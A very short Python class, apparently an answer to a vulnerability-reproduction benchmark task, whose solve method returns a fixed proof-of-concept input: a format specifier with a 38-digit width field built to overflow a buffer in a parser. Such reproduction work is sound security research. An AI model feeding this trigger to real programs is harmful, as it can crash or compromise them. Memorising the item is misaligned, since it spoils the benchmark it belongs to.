class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'%' + b'1' * 38 + b'd'
        return poc
